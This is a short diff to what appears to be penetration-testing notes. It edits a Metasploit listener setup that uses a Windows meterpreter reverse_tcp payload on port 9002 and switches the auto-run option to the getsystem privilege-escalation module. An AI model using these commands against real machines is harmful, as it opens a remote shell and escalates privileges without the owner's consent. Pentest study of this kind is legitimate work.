@@ -21,7 +21,7 @@ Setup Listener
  set payload windows/meterpreter/reverse_tcp
  set LHOST eth0
  set LPORT 9002
- set AutoRunScript getsystem
+ set InitialAutoRunScript "post/windows/escalate/getsystem"
  exploit
  ```
 
